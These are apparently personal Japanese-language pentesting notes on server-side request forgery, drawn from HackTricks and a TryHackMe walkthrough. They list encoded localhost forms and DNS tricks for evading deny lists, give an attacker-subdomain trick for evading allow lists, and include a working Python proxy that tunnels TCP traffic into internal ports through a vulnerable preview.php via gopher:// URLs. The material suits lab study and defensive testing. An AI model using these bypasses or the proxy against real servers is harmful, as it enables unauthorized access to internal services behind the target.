# SSRF

## 拒否リスト、許可リスト

### 拒否リストを回避する方法

https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.html?highlight=localhost#localhost

```text
（拒否リストにローカルホストが載っている場合）
0
0.0.0.0
0000
127.1
127.*.*.*
2130706433
017700000001
0x7f000001
などの代替ローカルホスト参照

または
127.0.0.1.nip.io
などの 127.0.0.1に解決されるDNSレコードを使って回避可能
```

### 許可リストを回避する方法

```text
https://website.thm
のみ許可するルールがある場合、自分のドメインにサブドメインを作成することで回避可能。IPアドレス形式のサブドメインも可能。
https://website.thm.attackers-domain.thm
```

## gopher://

https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html?highlight=gopher#gopher

preview.php にSSRFの脆弱性があり、内部の10000ポートが開いているケース。  
`gopher://` とプロキシサーバーを使ってローカルの5000ポート経由で通信できるようにしている。

https://medium.com/@sornphut/extract-tryhackme-walkthough-881daf0ca120 より

```python
#!/usr/bin/env python3

import socket
import requests
import urllib.parse
import threading

LHOST = '127.0.0.1'
LPORT = 5000
TARGET_HOST = "cvssm1"
HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = 10000

def handle_client(conn, addr):
    with conn:
        data = conn.recv(65536)
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))
        target_url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded_data}"
        resp = requests.get(target_url)
        conn.sendall(resp.content)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((LHOST, LPORT))
    s.listen()
    print(f"Listening on {LHOST}:{LPORT}, proxying to {HOST_TO_PROXY}:{PORT_TO_PROXY} via {TARGET_HOST}...")
    while True:
        conn, addr = s.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        client_thread.start()
```

```sh
curl -v http://127.0.0.1:5000/
```
